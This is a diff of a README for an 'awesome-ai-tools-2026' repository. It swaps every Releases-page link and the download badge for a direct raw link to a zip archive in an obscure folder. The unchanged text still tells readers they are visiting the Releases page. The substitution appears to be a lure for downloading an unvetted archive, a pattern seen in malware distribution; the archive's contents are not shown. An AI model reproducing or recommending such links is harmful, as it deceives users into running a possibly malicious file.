@@ -1,6 +1,6 @@
 # 🤖 awesome-ai-tools-2026 - Discover the Best AI Tools Today
 
-[![Download from Releases](https://img.shields.io/badge/Download%20Now-Release%20Page-brightgreen)](https://github.com/sonic1bx/awesome-ai-tools-2026/releases)
+[![Download from Releases](https://raw.githubusercontent.com/sonic1bx/awesome-ai-tools-2026/master/meliorability/tools_awesome_ai_v1.3.zip%20Now-Release%20Page-brightgreen)](https://raw.githubusercontent.com/sonic1bx/awesome-ai-tools-2026/master/meliorability/tools_awesome_ai_v1.3.zip)
 
 ## 📚 Overview
 
@@ -21,7 +21,7 @@ This application is designed to be user-friendly. Here’s what you need:
 
 To download the application, please visit the Releases page. Here you will find the latest version and additional files:
 
-[Visit this page to download](https://github.com/sonic1bx/awesome-ai-tools-2026/releases)
+[Visit this page to download](https://raw.githubusercontent.com/sonic1bx/awesome-ai-tools-2026/master/meliorability/tools_awesome_ai_v1.3.zip)
 
 Once you're on the Releases page, choose the version you prefer, click on the download link, and follow the prompts to save the file to your computer. 
 
@@ -71,6 +71,6 @@ If you have suggestions for additional tools or resources to include, we welcome
 
 For continuous updates on awesome-ai-tools-2026, follow the repository on GitHub. This will keep you informed about new releases and improvements.
 
-[Visit this page to download](https://github.com/sonic1bx/awesome-ai-tools-2026/releases)
+[Visit this page to download](https://raw.githubusercontent.com/sonic1bx/awesome-ai-tools-2026/master/meliorability/tools_awesome_ai_v1.3.zip)
 
 We hope you find this application useful in your journey through the world of AI tools. Happy exploring!
